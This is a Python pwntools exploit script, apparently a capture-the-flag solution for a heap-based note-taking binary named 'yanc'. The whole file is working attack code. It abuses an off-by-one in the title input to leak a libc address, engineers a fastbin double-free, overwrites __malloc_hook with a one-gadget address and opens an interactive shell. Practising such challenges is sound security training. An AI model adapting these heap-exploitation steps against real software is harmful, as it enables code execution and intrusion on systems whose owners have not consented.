from pwn import *

def alloc(note, title):
	r.sendlineafter('quit\n', '1')

	if len(note) < 255:
		note += '\n'
	r.sendafter("note : ", note)
	
	# off-by-one
	if len(title) < 0x21:
		title += '\n'
	
	r.sendafter('title : ', title)
	return

def free(idx):
	r.sendlineafter('quit\n', '2')
	r.sendlineafter('one : ', str(idx))
	return

def view():
	r.sendlineafter('quit\n', '3')
	return

def leak():
	view()
	for i in xrange(3):
		r.recvuntil('Note : ')
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	alloc('A'*0xa0, 'A') # 0
	alloc('B'*0x20, 'A') # 1
	alloc('C'*0x80, 'A') # 2
	alloc('D'*0x20, 'A') # 3
	alloc('E'*0x80, 'A') # 4

	# chunk to leak libc from
	free(0)
	free(1)

	# re-allocate note #0, #1 and partially overwrite note #2
	alloc('E'*0x20, 'A'*0x20) # 0
	alloc('F'*0x20, 'A'*0x20 + p8(0x40)) # 1

	libc          = leak() - 0x3c4b78
	__malloc_hook = libc + 0x3c4b10 - 0x23
	magic         = libc + 0xf02a4
	log.success('Libc: 0x{:x}'.format(libc))
	
	# fix note #2
	free(1)
	alloc('F'*0x20, 'A'*0x20 + p8(0xf0)) # 1

	# clean up the heap
	free(0)
	free(1)
	free(2)
	free(3)
	free(4)

	alloc('A'*0x60, 'A') # 0
	alloc('B'*0x20, 'A') # 1
	alloc('C'*0x60, 'A') # 2
	alloc('D'*0x60, 'A') # 3

	free(1)
	# partially overwrite note #2's pointer with note #0's to create a double-free scenario
	alloc('E'*0x20, 'A'*0x20 + p8(0x10)) # 1

	# now both 0th and 2nd entry point to note #0, off to double-free
	free(0)
	free(3)
	free(2)

	alloc(p64(__malloc_hook) + 'A'*0x58, 'kek')
	alloc('A'*0x60, 'kek')
	alloc('A'*0x60, 'kek')
	alloc('A'*0x13 + p64(magic) + 'A'*(0x60 - 8 - 0x13), 'kek')

	r.sendlineafter('quit\n', '1')
	r.sendline('game over')

	r.interactive()

if __name__ == "__main__":
    if sys.argv[1] == "r":
        r = remote('',)
        pwn()
    else:
        r = process('./yanc')
        pause()
        pwn()
